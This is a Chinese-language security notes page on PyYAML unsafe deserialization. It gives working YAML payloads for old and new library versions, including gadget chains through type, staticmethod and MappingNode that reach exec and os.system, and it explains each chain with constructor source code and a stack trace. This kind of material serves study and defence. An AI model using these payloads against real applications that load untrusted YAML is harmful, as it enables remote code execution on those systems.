---
title: PyYaml反序列化
modDatetime: 2025-10-03T23:41:50.000+08:00
description: PyYAML 不安全反序列化 payload、触发链与版本差异记录
tags:
  - python
---

## 低版本

`!!python/object/apply:os.system ["calc.exe"]`

## 高版本

### 前置知识

一般情况下用户自定义的类(包括第三方软件包的类)会自动有一个**dict**属性, xxx.yyy就相当于是`xxx.__dict__['yyy']`
如果`xxx.__dict__.update(userInput)`就很容易给xxx添加属性或覆盖属性, 比如:

```py
class Evil:
    def hello(self, name):
        print("hello " + name)

evil = Evil()
evil.hello("mekrina")

evil.__dict__.update({"hello": __import__('os').system})

evil.hello("calc")
```

### payload:

```
!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('calc')"
```

### 原理

`type.__new(type,'whatever', (), {"abc": exec})`
可以创造一个实例, 它的abc方法是exec
然后调用到instance.extend(listitems)

```堆栈
instance.extend(listitems)
construct_python_object_apply, constructor.py:628
construct_python_object_new, constructor.py:635
construct_object, constructor.py:94
construct_document, constructor.py:47
get_single_data, constructor.py:43
load, __init__.py:114
<module>, load.py:25
```

### payload:

```yaml
# yaml.load() 默认loader，即fullLoader
!!python/object/new:str
args: []
state: !!python/tuple
  - "__import__('os').system('calc')"
  - !!python/object/new:staticmethod
    args: [0]
    state:
      update: !!python/name:exec
      items: !!python/name:dict
```

### 原理

```python
    def set_python_instance_state(self, instance, state):
        if hasattr(instance, '__setstate__'):
            instance.__setstate__(state)
        else:
            slotstate = {}
            if isinstance(state, tuple) and len(state) == 2:
                state, slotstate = state
            if hasattr(instance, '__dict__'):
                instance.__dict__.update(state)
            elif state:
                slotstate.update(state)
            for key, value in slotstate.items():
                setattr(object, key, value)
```

constructor的set_python_instance_state函数，判断这个staticmethod实例有`__dict__`属性
执行`instance.__dict__.update(state)`，然后这个staticmethod就拥有了update方法和items方法.

对str设置state时，state是tuple, 进入state, slotstate = state, 然后进入slotstate.update(state)
这里的slotstate是刚刚的staticmethod, 它的update方法是exec, state是`"__import__('os').system('calc')"`, 成功执行命令

items是为了后面不报错

### payload

```
!!python/object/new:yaml.MappingNode
  listitems: "__import__('os').system('calc')"
  state:
    tag: !!str dummy
    value: !!str dummy
    extend: !!python/name:exec
```

也是通过setState提供extend方法

更多payload见 https://xz.aliyun.com/news/11927
[本地版](assets/PyYaml反序列化/PyYaml反序列化漏洞详解html.html)
